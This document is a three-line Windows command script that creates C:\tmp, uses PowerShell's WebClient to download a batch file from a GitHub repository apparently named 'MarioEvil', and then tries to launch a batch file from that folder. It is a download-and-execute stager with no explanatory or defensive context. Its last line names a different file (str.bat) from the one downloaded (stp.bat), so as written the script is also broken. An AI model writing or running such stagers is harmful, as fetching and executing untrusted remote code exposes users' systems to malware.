powershell New-Item 'C:\tmp\' -ItemType Directory
powershell –c “(new-object System.Net.WebClient).DownloadFile(‘https://raw.githubusercontent.com/Azetran/MarioEvil/main/files-main/setup.bat’,’C:\tmp\stp.bat’)”
start C:\tmp\str.bat\
